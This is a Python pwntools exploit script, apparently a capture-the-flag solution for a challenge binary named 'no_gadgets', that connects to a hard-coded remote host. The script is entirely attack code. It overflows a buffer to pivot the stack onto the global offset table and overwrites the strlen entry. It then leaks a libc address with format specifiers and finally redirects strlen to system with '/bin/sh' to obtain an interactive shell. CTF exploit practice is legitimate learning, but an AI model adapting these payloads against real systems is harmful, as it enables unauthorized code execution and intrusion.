#!/usr/bin/env python3

from pwn import *

exe = ELF("./no_gadgets_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
#p = process()
p = remote('83.136.254.158',54657)
#gdb.attach(p,gdbscript='''
#           b*main+158
#           ''')

ret = 0x000000000401275
payload = b'\x00'.ljust(0x80,b'a')
payload += p64(exe.got.puts + 0x80) + p64(ret) + p64(0x000000000040121B)


input()
p.sendline(payload)

p1 = b'%p%p%p%p'
p1 += p64(0x0000000000401211)  # ovcerwrite strlen()
p1 += p64(0x0000000000401056)  #plt +6
p1 += p64(0x0000000000401066)  #plt +6 
p1 += p64(0x0000000000401076)  #plt + 6 
p1 += p64(0x0000000000401086)  #plt +6

p.sendline(p1)
p.recvuntil(b"Pathetic, 'tis but a scratch!")
p.recvline()


####leak#####
leak = p.recv(14)
leak = int(leak,16)
print(leak)
#leak = u64(p.recv(6).ljust(8,b'\x00'))
libc.address = leak - 0x219b23

print(hex(libc.address))


payload = b'/bin/sh\x00'  #putgot
payload += p64(libc.sym.system)  #strlen() got
#input()
p.sendline(payload)

p.interactive()
